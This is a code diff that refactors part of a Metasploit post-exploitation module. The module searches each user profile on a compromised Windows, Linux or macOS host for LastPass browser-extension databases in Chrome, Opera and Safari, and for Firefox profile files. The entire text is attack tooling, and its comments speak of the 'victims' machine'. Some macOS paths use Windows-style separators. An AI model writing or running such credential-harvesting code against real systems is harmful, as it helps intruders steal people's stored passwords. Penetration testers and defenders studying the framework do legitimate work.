@@ -74,83 +74,32 @@ class Metasploit3 < Msf::Post
   def database_paths
     platform = session.platform
     existing_profiles = user_profiles
+    found_dbs_paths = []
 
     case platform
     when /win/
       os = session.sys.config.sysinfo['OS']
 
-      if os =~ /Vista|Windows 7|Windows 8/
-        existing_profiles.each do |user_profile|
-          print_status "Found user: #{user_profile['UserName']}"
+      existing_profiles.each do |user_profile|
+        print_status "Found user: #{user_profile['UserName']}"
 
-          # Check Firefox
-          print_status 'Checking in Firefox...'
-          profiles = profile_paths("#{user_profile['AppData']}\\Mozilla\Firefox\Profiles", "Firefox")
-          if profiles
-            print_good "Found #{profiles.size} profile files in Firefox"
-            profiles.each do |profile_path|
-              file_paths = ["#{profile_path}\\prefs.js"]
-              found_dbs_paths.push(file_paths)
-            end
-          end
+        # Check Firefox
+        path = "#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles"
+        found_dbs_paths.push(find_db_paths(path, "Firefox"))
 
-          # Check Chrome
-          path = "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
-          file_paths = file_paths(path, 'Chrome')
-          found_dbs_paths.push(file_paths) unless file_paths.nil?
+        # Check Chrome
+        path = "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
+        found_dbs_paths.push(find_db_paths(path, "Chrome"))
 
-          # Check Opera
-          path = "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
-          file_paths = file_paths(path, 'Opera')
-          found_dbs_paths.push(file_paths) unless file_paths.nil?
+        # Check Opera
+        path = "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
+        found_dbs_paths.push(find_db_paths(path, "Opera"))
 
-          # Check Safari
-          path = "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
-          file_paths = file_paths(path, 'Safari')
-          found_dbs_paths.push(file_paths) unless file_paths.nil?
+        # Check Safari
+        path = "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
+        found_dbs_paths.push(find_db_paths(path, "Safari"))
 
-          print_line ""
-        end
-
-      elsif os =~ /XP/
-        existing_profiles.each do |user_profile|
-          print_status "Found user: #{user_profile['UserName']}"
-
-          # Check Firefox
-          print_status 'Checking in Firefox...'
-          profiles = profile_paths("#{user_profile['AppData']}\\Mozilla\\Firefox\\Profiles", "Firefox")
-          if profiles
-            print_good "Found #{profiles.size} profile files in Firefox"
-            profiles.each do |profile_path|
-              file_paths = ["#{profile_path}\\prefs.js"]
-              found_dbs_paths.push(file_paths)
-            end
-          end
-
-          # Check Chrome
-          print_status 'Checking in Chrome...'
-          path = "#{user_profile['LocalAppData']}\\Google\\Chrome\\User Data\\Default\\databases\\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
-          file_paths = file_paths(path, 'Chrome')
-          found_dbs_paths.push(file_paths) unless file_paths.nil?
-
-          # Check Opera
-          print_status 'Checking in Opera...'
-          path = "#{user_profile['AppData']}\\Opera Software\\Opera Stable\\databases\\chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
-          file_paths = file_paths(path, 'Opera')
-          found_dbs_paths.push(file_paths) unless file_paths.nil?
-
-          # Check Safari
-          print_status 'Checking in Safari...'
-          path = "#{user_profile['LocalAppData']}\\Apple Computer\\Safari\\Databases\\safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
-          file_paths = file_paths(path, 'Safari')
-          found_dbs_paths.push(file_paths) unless file_paths.nil?
-
-          print_line ""
-        end
-
-      else
-        print_error "OS not recognized: #{os}"
-        return nil
+        print_line ""
       end
 
     when /unix|linux/
@@ -158,20 +107,12 @@ class Metasploit3 < Msf::Post
         print_status "Found user: #{user_profile['UserName']}"
 
         # Check Firefox
-        print_status 'Checking in Firefox...'
-        profiles = profile_paths("#{user_profile['LocalAppData']}/.mozilla/firefox", "Firefox")
-        if profiles
-          print_good "Found #{profiles.size} profile files in Firefox"
-          profiles.each do |profile_path|
-            file_paths = ["#{profile_path}/prefs.js"]
-            found_dbs_paths.push(file_paths)
-          end
-        end
+        path = "#{user_profile['LocalAppData']}/.mozilla/firefox"
+        found_dbs_paths.push(find_db_paths(path, "Firefox"))
 
         # Check Chrome
         path = "#{user_profile['LocalAppData']}/.config/google-chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
-        file_paths = file_paths(path, 'Chrome')
-        found_dbs_paths.push(file_paths) unless file_paths.nil?
+        found_dbs_paths.push(find_db_paths(path, "Chrome"))
       end
 
     when /osx/
@@ -179,30 +120,20 @@ class Metasploit3 < Msf::Post
         print_status "Found user: #{user_profile['UserName']}"
 
         # Check Firefox
-        print_status 'Checking in Firefox...'
-        profiles = profile_paths("#{user_profile['LocalAppData']}\\Firefox\\Profiles", "Firefox")
-        if profiles
-          print_good "Found #{profiles.size} profile files in Firefox"
-          profiles.each do |profile_path|
-            file_paths = ["#{profile_path}\\prefs.js"]
-            found_dbs_paths.push(file_paths)
-          end
-        end
+        path = "#{user_profile['LocalAppData']}\\Firefox\\Profiles"
+        found_dbs_paths.push(find_db_paths(path, "Firefox"))
 
         # Check Chrome
         path = "#{user_profile['LocalAppData']}/Google/Chrome/Default/databases/chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0"
-        file_paths = file_paths(path, 'Chrome')
-        found_dbs_paths.push(file_paths) unless file_paths.nil?
+        found_dbs_paths.push(find_db_paths(path, "Chrome"))
 
         # Check Safari
         path = "#{user_profile['AppData']}/Safari/Databases/safari-extension_com.lastpass.lpsafariextension-n24rep3bmn_0"
-        file_paths = file_paths(path, 'Safari')
-        found_dbs_paths.push(file_paths) unless file_paths.nil?
+        found_dbs_paths.push(find_db_paths(path, "Safari"))
 
         # Check Opera
         path = "#{user_profile['LocalAppData']}/com.operasoftware.Opera/databases/chrome-extension_hnjalnkldgigidggphhmacmimbdlafdo_0"
-        file_paths = file_paths(path, 'Opera')
-        found_dbs_paths.push(file_paths) unless file_paths.nil?
+        found_dbs_paths.push(find_db_paths(path, "Opera"))
       end
 
     else
@@ -213,10 +144,26 @@ class Metasploit3 < Msf::Post
     found_dbs_paths.flatten
   end
 
-  # Returns a list of DB paths in the victims' machine
+  # Returns a list of DB paths found in the victims' machine
   def find_db_paths(path, browser)
     found_dbs_paths = []
 
+    print_status "Checking in #{browser}..."
+    if browser == "Firefox" # Special case for Firefox
+      profiles = profile_paths(path, browser)
+      if profiles
+        print_good "Found #{profiles.size} profile files in Firefox"
+        profiles.each do |profile_path|
+          file_paths = ["#{profile_path}\\prefs.js"]
+          found_dbs_paths.push(file_paths)
+        end
+      end    
+    else
+      file_paths = file_paths(path, browser)
+      found_dbs_paths.push(file_paths) unless file_paths.nil?
+    end
+
+    found_dbs_paths
   end
 
 
